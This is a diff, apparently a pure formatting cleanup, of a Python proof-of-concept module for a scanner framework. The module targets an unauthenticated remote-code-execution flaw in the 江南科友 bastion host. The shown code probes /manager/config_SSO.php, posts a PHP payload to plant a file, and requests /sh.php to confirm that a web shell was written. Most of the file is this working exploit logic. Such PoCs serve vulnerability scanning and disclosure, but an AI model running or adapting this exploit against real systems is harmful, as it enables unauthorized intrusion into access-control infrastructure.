@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Keyou_0001' # 平台漏洞编号，留空
+    vuln_id = 'Keyou_0001'  # 平台漏洞编号，留空
     name = '江南科友堡垒机 未授权访问可getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-09-23'  # 漏洞公布时间
     desc = '''  
         江南科友堡垒机该漏洞在 /manager/config_SSO.php 当中
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '江南科友堡垒机'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '62d1a924-b50b-441d-96e9-76ca18b5ea0a'
@@ -33,14 +35,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #wooyun-2014-077033
+
+            # wooyun-2014-077033
             hh = hackhttp.hackhttp()
             arg = self.target
             path = '/manager/config_SSO.php'
             target = arg + path
             code, head, res, errcode, _ = hh.http(target)
-            if code==200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
+            if code == 200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
                 #security_warning("Unauthorized access"+target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -52,14 +54,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #wooyun-2014-077033
+
+            # wooyun-2014-077033
             hh = hackhttp.hackhttp()
             arg = self.target
             path = '/manager/config_SSO.php'
             target = arg + path
             code, head, res, errcode, _ = hh.http(target)
-            if code==200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
+            if code == 200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
                 #security_warning("Unauthorized access"+target)
                 shell_data = "type_mode=5201314<?php echo md5(3.14);?>&os_name=HP_11&config_flag=1"
                 code, head, res, errcode, _ = hh.http(target, shell_data)
@@ -67,13 +69,14 @@ class Poc(ABPoc):
                 code, head, res, errcode, _ = hh.http(target, exec_data)
                 target = arg + '/sh.php'
                 code, head, res, errcode, _ = hh.http(target)
-                if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res:
-                    #security_hole("getshell:"+target)
+                if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
+                    # security_hole("getshell:"+target)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取shell为：{shell}'.format(
                         target=self.target, name=self.vuln.name, shell=target))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
